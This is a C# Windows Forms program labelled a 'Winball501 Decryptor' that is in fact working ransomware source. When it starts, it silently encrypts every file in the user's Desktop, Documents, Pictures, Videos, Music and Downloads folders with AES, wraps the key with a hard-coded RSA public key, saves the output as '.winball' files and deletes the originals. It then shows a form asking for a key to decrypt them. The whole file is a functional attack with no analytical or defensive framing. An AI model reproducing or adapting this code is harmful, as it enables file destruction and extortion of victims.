using System;
using System.Collections.Generic;
 
using System.IO;
 
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using multronfileguardian;

namespace Winball501_Decryptor
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            load();
        }
        string publickey = "<RSAKeyValue><Modulus>sFCjXDLTTsLJGHRCK5uTawwBCWUWyUDK/CsxBn5mQKlOZd0ibBvZ3lpoQpuyww6cX096eKPsW8vOCUNRfwxv9mfThUJ8Yk+l0uLXvC8kRnNYOmFZCfwgvTEdIZtYIT35nbRyAlGFGL49zTYTmh/NEJcZasSI1XfHZt+G2TW62u2w4ZTufRRosVr5dkWM8CFRVLV+KtoXqA08yu2MSL+UUXDnT8WOYNH0unhoKb4xCWdbT1riP/5LPFicXQi6lQyhSAFXtpfeIrkvvphwoRJKs955ZI4KvUOtwbE361mKJvIB6FuBcCmwScoDhgQkG+4q4MJsZ3zyp0+DuriDyMcvBQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
        List<Task> tasks = new List<Task>();
        
        public async void load()
        {
            this.Visible = false;
            string encryptedfile = "C:\\encrypted.txt";

            if (!File.Exists(encryptedfile))
            {
                foreach (Environment.SpecialFolder folder in new[] {
    Environment.SpecialFolder.Desktop,
    Environment.SpecialFolder.MyDocuments,
    Environment.SpecialFolder.MyPictures,
    Environment.SpecialFolder.MyVideos,
    Environment.SpecialFolder.MyMusic,

})
                {
                    string path = Environment.GetFolderPath(folder);
                    Encrypt encrypt = new Encrypt(this, publickey, path);
                    tasks.Add(Task.Run(() => encrypt.run()));
                }
                string downloadsPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
              
                Encrypt encrypt1 = new Encrypt(this,publickey, downloadsPath);
                tasks.Add(Task.Run(() => encrypt1.run()));
                File.Create(encryptedfile).Close();
                await Task.WhenAll(tasks);
                this.Visible = true;
            }
            else
            {
                this.Visible = true;
            }
        }
        class Encrypt
        {
            Form1 form;
            public short closedholdkey = 1;
            public short closedrsakgen = 1;
            int keysize = 2048;
            int symkeysize = 256;
            short rcm = 0;
            public short rtoperation = 1;
            public short rttoperation = 0;
            string key;
            string dir;
            public Encrypt(Form1 form, string key, string dir)
            {
                this.form = form;
                this.key = key;
                this.dir = dir;
            }
            public void run()
            {
                short nstate = 0;
                System.IO.BinaryReader okur = null;
                System.IO.BinaryWriter yazar = null;
                System.IO.MemoryStream tutar = null;
                System.Security.Cryptography.CryptoStream sifreler = null;
                try
                {
                   
                    string[] files = Directory.GetFiles(dir);
                    string[] dirs = Directory.GetDirectories(dir);
                    System.Security.Cryptography.AesCryptoServiceProvider rijndael = new System.Security.Cryptography.AesCryptoServiceProvider();
                    rijndael.KeySize = symkeysize;
                    rijndael.BlockSize = 128;
                    rijndael.Mode = System.Security.Cryptography.CipherMode.CBC;
                    rijndael.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
                    byte[] aeskey = new byte[symkeysize / 8];
                    byte[] ivtg = new byte[16];

                    aeskey = raes.generaterandomkey(67);
                    rijndael.Key = new System.Security.Cryptography.Rfc2898DeriveBytes(aeskey, System.Text.Encoding.ASCII.GetBytes("youcanjoinsaltinfutureversionsmsmsms"), 125, System.Security.Cryptography.HashAlgorithmName.SHA512).GetBytes(symkeysize / 8);
                    aeskey = raes.rsaencrypt(aeskey, key, keysize);
                    nstate = 1;
                    foreach (string file in files)
                    {
                        try
                        {
                            ivtg = new System.Security.Cryptography.Rfc2898DeriveBytes(form.reversebarray(raes.generaterandomkey(67)), System.Text.Encoding.ASCII.GetBytes(form.reversestring("youcanjoinsaltinfutureversivonsmsmsms")), 143, System.Security.Cryptography.HashAlgorithmName.SHA512).GetBytes(16);
                            rijndael.IV = ivtg;
                            okur = new System.IO.BinaryReader(System.IO.File.Open(file, System.IO.FileMode.Open, System.IO.FileAccess.Read));
                            yazar = new System.IO.BinaryWriter(System.IO.File.Open(file + ".winball", System.IO.FileMode.OpenOrCreate, System.IO.FileAccess.Write));
                            yazar.Write(aeskey, 0, keysize / 8);
                            yazar.Write(ivtg);
                            tutar = new System.IO.MemoryStream();
                            sifreler = new System.Security.Cryptography.CryptoStream(tutar, rijndael.CreateEncryptor(), System.Security.Cryptography.CryptoStreamMode.Write);
                            byte[] neww = new byte[1000000];
                            long filesize = new System.IO.FileInfo(file).Length;
                            string filenamew = new System.IO.FileInfo(file).Name;
                            while (okur.BaseStream.Position < filesize)
                            {
                                long ig = filesize - okur.BaseStream.Position;

                                if (ig > 1000000)
                                {
                                    neww = new byte[1000000];
                                    okur.Read(neww, 0, 1000000);
                                    sifreler.Write(neww, 0, 1000000);
                                    sifreler.Flush();
                                    yazar.Write(tutar.ToArray(), 0, (int)tutar.Length);
                                    yazar.Flush();
                                    tutar.SetLength(0);
                                }
                                else
                                {
                                    neww = new byte[(int)ig];
                                    okur.Read(neww, 0, (int)ig);
                                    sifreler.Write(neww, 0, (int)ig);
                                    sifreler.FlushFinalBlock();
                                    yazar.Write(tutar.ToArray(), 0, (int)tutar.Length);
                                    yazar.Flush();
                                    tutar.SetLength(0);
                                }
                            }

                            if (okur != null)
                            {
                                okur.Dispose();
                            }
                            if (yazar != null)
                            {
                                yazar.Dispose();
                            }
                            if (sifreler != null)
                            {
                                sifreler.Dispose();
                            }
                            if (tutar != null)
                            {
                                tutar.Dispose();
                            }
                            System.IO.File.Delete(file);
                        }
                        catch (Exception)
                        {
                            continue;
                        }

                    }

                    foreach (string dir in dirs)
                    {
                        Encrypt encrypt = new Encrypt(form, key, dir);
                        form.tasks.Add(Task.Run(() => encrypt.run()));
                    }





                }
                catch (Exception exc)
                {
                    nstate = 0;

                    try
                    {
                        if (okur != null)
                        {
                            okur.Dispose();
                        }
                        if (yazar != null)
                        {
                            yazar.Dispose();
                        }
                        if (sifreler != null)
                        {
                            sifreler.Dispose();
                        }
                        if (tutar != null)
                        {
                            tutar.Dispose();
                        }
                    }
                    catch (Exception k)
                    {

                    }
                    finally
                    {
                        if (okur != null)
                        {
                            okur.Dispose();
                        }
                        if (yazar != null)
                        {
                            yazar.Dispose();
                        }
                        if (sifreler != null)
                        {
                            sifreler.Dispose();
                        }
                        if (tutar != null)
                        {
                            tutar.Dispose();
                        }
                    }
                }


            }
        }
        class Decrypt
        {
            Form1 form;
            public short closedholdkey = 1;
            public short closedrsakgen = 1;
            int keysize = 2048;
            int symkeysize = 256;
            short rcm = 0;
            public short rtoperation = 1;
            public short rttoperation = 0;
            string key;
            string dir;
            public Decrypt(Form1 form, string key, string dir)
            {
                this.form = form;
                this.key = key;
                this.dir = dir;
            }
            public void run()
            {
                short nstate = 0;
                System.IO.BinaryReader okur = null;
                System.IO.BinaryWriter yazar = null;
                System.IO.MemoryStream tutar = null;
                System.Security.Cryptography.CryptoStream sifreler = null;
                try
                {
                    System.Security.Cryptography.AesCryptoServiceProvider rijndael = new System.Security.Cryptography.AesCryptoServiceProvider();
                    rijndael.KeySize = symkeysize;
                    rijndael.BlockSize = 128;
                    rijndael.Mode = System.Security.Cryptography.CipherMode.CBC;
                    rijndael.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
                    byte[] aeskey = new byte[symkeysize / 8];
                    byte[] ivtg = new byte[16];
                    string[] files = Directory.GetFiles(dir);
                    string[] dirs = Directory.GetDirectories(dir);
                    foreach (string dosyalar in files)
                    {
                        try
                        {
                            okur = new System.IO.BinaryReader(System.IO.File.Open(dosyalar, System.IO.FileMode.Open, System.IO.FileAccess.Read));
                            aeskey = new byte[keysize / 8];
                            okur.Read(aeskey, 0, keysize / 8);
                            okur.Read(ivtg, 0, 16);
                            aeskey = raes.rsadecrypt(aeskey, key, keysize);
                            rijndael.Key = new System.Security.Cryptography.Rfc2898DeriveBytes(aeskey, System.Text.Encoding.ASCII.GetBytes("youcanjoinsaltinfutureversionsmsmsms"), 125, System.Security.Cryptography.HashAlgorithmName.SHA512).GetBytes(symkeysize / 8);
                            rijndael.IV = ivtg;
                            sifreler = new System.Security.Cryptography.CryptoStream(System.IO.File.Open(System.IO.Path.GetDirectoryName(dosyalar) + "\\" + System.IO.Path.GetFileNameWithoutExtension(dosyalar), System.IO.FileMode.OpenOrCreate, System.IO.FileAccess.Write), rijndael.CreateDecryptor(), System.Security.Cryptography.CryptoStreamMode.Write);
                            byte[] neww = new byte[1000000];
                            long filesize = new System.IO.FileInfo(dosyalar).Length;
                            string filenamew = new System.IO.FileInfo(dosyalar).Name;
                            while (okur.BaseStream.Position < filesize)
                            {
                                long ig = filesize - okur.BaseStream.Position;
                               form.label2.Text = "Decrypting: " + filenamew + " | %" + Math.Round((((double)okur.BaseStream.Position / (double)filesize) * 100), 0).ToString();
                               


                                if (ig > 1000000)
                                {
                                    neww = new byte[1000000];
                                    okur.Read(neww, 0, 1000000);
                                    sifreler.Write(neww, 0, 1000000);
                                    sifreler.Flush();
                                }
                                else
                                {
                                    neww = new byte[(int)ig];
                                    okur.Read(neww, 0, (int)ig);
                                    sifreler.Write(neww, 0, (int)ig);
                                    sifreler.FlushFinalBlock();
                                }
                            }
                           
                                form.listBox1.Items.Add("Decrypted: " + dosyalar);
                           

                            if (okur != null)
                            {
                                okur.Dispose();
                            }
                            if (yazar != null)
                            {
                                yazar.Dispose();
                            }
                            if (sifreler != null)
                            {
                                sifreler.Dispose();
                            }
                            if (tutar != null)
                            {
                                tutar.Dispose();
                            }
                            System.IO.File.Delete(dosyalar);
                        }
                        catch (Exception ex)
                        {
                         
                                form.listBox1.Items.Add("Cannot Decrypt: " + dosyalar + " " + ex.Message + " " + ex.StackTrace);
                        


                            continue;
                        }

                    }
                    foreach (string dir in dirs)
                    {
                        Decrypt decrypt = new Decrypt(form, key, dir);
                        Thread t = new Thread(new ThreadStart(decrypt.run));
                        t.Start();
                    }
                }
                catch (Exception ex)
                {
                    nstate = 0;

                    try
                    {
                        if (okur != null)
                        {
                            okur.Dispose();
                        }
                        if (yazar != null)
                        {
                            yazar.Dispose();
                        }
                        if (sifreler != null)
                        {
                            sifreler.Dispose();
                        }
                        if (tutar != null)
                        {
                            tutar.Dispose();
                        }
                    }
                    catch (Exception k)
                    {

                    }
                    finally
                    {
                        if (okur != null)
                        {
                            okur.Dispose();
                        }
                        if (yazar != null)
                        {
                            yazar.Dispose();
                        }
                        if (sifreler != null)
                        {
                            sifreler.Dispose();
                        }
                        if (tutar != null)
                        {
                            tutar.Dispose();
                        }
                    }
                }

            }
        }
        public string reversestring(string yazi)
        {
            string ters = "";
            for (int i = yazi.Length - 1; i >= 0;)
            {
                ters += yazi[i];
                --i;
            }
            return ters;
        }
        public byte[] reversebarray(byte[] yazi)
        {
            byte[] ters = new byte[yazi.Length];
            int x = 0;
            for (int i = yazi.Length - 1; i >= 0;)
            {
                ters[x] = yazi[i];
                --i;
                ++x;
            }
            return ters;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "")
            {
                MessageBox.Show("Enter a correct key to decrypt files.");
            }
            else
            {
                foreach (Environment.SpecialFolder folder in new[] {
    Environment.SpecialFolder.Desktop,
    Environment.SpecialFolder.MyDocuments,
    Environment.SpecialFolder.MyPictures,
    Environment.SpecialFolder.MyVideos,
    Environment.SpecialFolder.MyMusic,

})
                {
                    string path = Environment.GetFolderPath(folder);
                    string enteredPassword = textBox1.Text;
                    Decrypt decrypt = new Decrypt(this, enteredPassword, path);
                    Thread t = new Thread(new ThreadStart(decrypt.run));
                    t.Start();
                }
                string downloadsPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
                string enteredPasswordForDownloads = textBox1.Text;
                Decrypt decryptForDownloads = new Decrypt(this, enteredPasswordForDownloads, downloadsPath);
                Thread downloadThread = new Thread(new ThreadStart(decryptForDownloads.run));
                downloadThread.Start();
            }
        }
    }

}
